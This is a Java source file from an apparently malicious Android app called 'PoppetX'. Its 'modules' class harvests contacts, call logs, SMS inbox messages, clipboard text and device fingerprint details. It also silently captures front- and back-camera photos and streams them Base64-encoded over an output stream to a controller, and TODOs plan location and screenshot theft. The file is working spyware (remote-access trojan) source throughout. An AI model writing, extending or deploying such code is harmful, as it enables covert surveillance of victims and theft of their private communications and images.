package com.example.poppetx;

import android.app.Activity;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.sql.Date;

public class modules {

    static final String END_HEADER = "POPPETX321";

    public static String getContactNumbers(Context mContext) {
        String allContacts = null;
        Cursor phones = mContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext()) {
            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            allContacts += name + " : " + phoneNumber + "\t";
        }
        phones.close();
        return allContacts;
    }

    public static String getCallLogs(Context mContext) {
        StringBuffer stringBuffer = new StringBuffer();
        Uri callURI = Uri.parse("content://call_log/calls");
        String[] columns =new String[] {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE};
        long dialed;
        String number;
        String duration;
        Cursor cursor = mContext.getContentResolver().query(callURI, columns, null, null, null);

        while (cursor.moveToNext()) {
            stringBuffer.append("\n");
            dialed = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
            number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
            stringBuffer.append("Call to number: " + number + ", registered at: " + new Date(dialed).toString() + " for duration " + duration);
        }
        cursor.close();
        stringBuffer.append(END_HEADER);
        return stringBuffer.toString() + "\n";
    }

    public static String getSystemInfo() {
        StringBuffer stringBuffer = new StringBuffer();
        Log.d("POPPET", "Inside here");
        stringBuffer.append(" System Info: \n");
        stringBuffer.append("\n OS Version: ").append(System.getProperty("os.version")).append(" - ").append(Build.VERSION.INCREMENTAL);
        stringBuffer.append("\n Device: ").append(Build.DEVICE);
        stringBuffer.append("\n Model: ").append(Build.MODEL).append(" - ").append(Build.PRODUCT);
        stringBuffer.append("\n API: ").append(Build.VERSION.SDK_INT);
        stringBuffer.append("\n Manufacturer: ").append(Build.MANUFACTURER);
        stringBuffer.append("\n Board: ").append(Build.BOARD);
        stringBuffer.append("\n Display: ").append(Build.DISPLAY);
        stringBuffer.append("\n Host: ").append(Build.HOST);
        stringBuffer.append("\n Fingerprint: ").append(Build.FINGERPRINT);
        stringBuffer.append(END_HEADER);

        return stringBuffer.toString() + "\n";
    }

    public static String getMessages(Context mContext) {
        StringBuffer allMessages = new StringBuffer();
        Uri messageUri = Uri.parse("content://sms/inbox/");
        Cursor messagesCursor = mContext.getContentResolver().query(messageUri, null, null, null, null);
        while ( messagesCursor != null && messagesCursor.moveToNext()) {
            String number = messagesCursor.getString(messagesCursor.getColumnIndex(Telephony.Sms.ADDRESS));
            String body = messagesCursor.getString(messagesCursor.getColumnIndex(Telephony.Sms.BODY));
            allMessages.append("\n Number: ").append(number);
            allMessages.append("\n Body: ").append(body);
        }
        messagesCursor.close();
        return allMessages.toString() + "\n";
    }

    public static String getClipBoardContent(Activity activity) {
        ClipboardManager clipboard = (ClipboardManager) activity.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard.hasPrimaryClip()) {
            android.content.ClipDescription description = clipboard.getPrimaryClipDescription();
            android.content.ClipData data = clipboard.getPrimaryClip();
            if (data != null && description != null && description.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN))
                return String.valueOf(data.getItemAt(0).getText());
        }
        return "Nothing found";
    }

    //TODO Merge getSelfie and getPhoto into one Method
    public static String getSelfie(Context mContext, OutputStream out) {
        StringBuffer entireEncodedSelfie = new StringBuffer();
        Camera camera;
        int cameraId = -1;

        if (mContext.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            int totalCameras = Camera.getNumberOfCameras();
            //Loop through all camera Id's to find Front facing one
            for (int i = 0; i < totalCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    cameraId = i;
                    break;
                }
            }
            if (cameraId < 0) {
                entireEncodedSelfie.append("No front facing camera was found on the device\n");
            } else {
                camera = Camera.open(cameraId);
                try {
                    camera.setPreviewTexture(new SurfaceTexture(0));
                    camera.startPreview();
                    camera.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            if (camera != null) {
                                camera.stopPreview();
                                camera.release();
                                camera = null;
                            }
                            //Convert the data to Image then encode it in Base64 String uuuuhhhh!!
                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                            bitmap.compress(Bitmap.CompressFormat.PNG, 90, byteArrayOutputStream);
                            byte[] bytes = byteArrayOutputStream.toByteArray();
                            entireEncodedSelfie.append(Base64.encodeToString(bytes, Base64.DEFAULT));
                            entireEncodedSelfie.append(END_HEADER + "\n");
                            Thread sendSelfie = new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        out.write(entireEncodedSelfie.toString().getBytes("UTF-8"));
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                            sendSelfie.start();
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } else {
            entireEncodedSelfie.append("No Camera hardware was detected on this device\n");
        }
        return entireEncodedSelfie.toString();
    }

    public static String getPhoto(Context mContext, OutputStream out) {
        StringBuffer entireEncodedImage = new StringBuffer();
        Camera camera;
        int cameraId = -1;

        if (mContext.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            int totalCameras = Camera.getNumberOfCameras();
            //Loop through all camera Id's to find Back Facing Camera
            for (int i = 0; i < totalCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    cameraId = i;
                    break;
                }
            }
            if (cameraId != Camera.CameraInfo.CAMERA_FACING_BACK) {
                entireEncodedImage.append("No back facing camera was found on the device\n");
            } else {
                camera = Camera.open(cameraId);
                try {
                    camera.setPreviewTexture(new SurfaceTexture(0));
                    camera.startPreview();
                    camera.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            if (camera != null) {
                                camera.stopPreview();
                                camera.release();
                                camera = null;
                            }
                            //Convert the data to Image then encode it in Base64 String uuuuhhhh!!
                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                            bitmap.compress(Bitmap.CompressFormat.PNG, 90, byteArrayOutputStream);
                            byte[] bytes = byteArrayOutputStream.toByteArray();
                            entireEncodedImage.append(Base64.encodeToString(bytes, Base64.DEFAULT));
                            entireEncodedImage.append(END_HEADER + "\n");
                            Thread sendImage = new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        out.write(entireEncodedImage.toString().getBytes("UTF-8"));
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                            sendImage.start();
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } else {
            entireEncodedImage.append("No Camera hardware was detected on this device\n");
        }
        return entireEncodedImage.toString();
    }

    public static boolean rootDetection() {
        return false;
    }

    //TODO (4) Research Start Mobile data and Wifi Method
    //TODO (5) Make getCurrentLocation
    //TODO (6) Make getScreenSnap Method

}
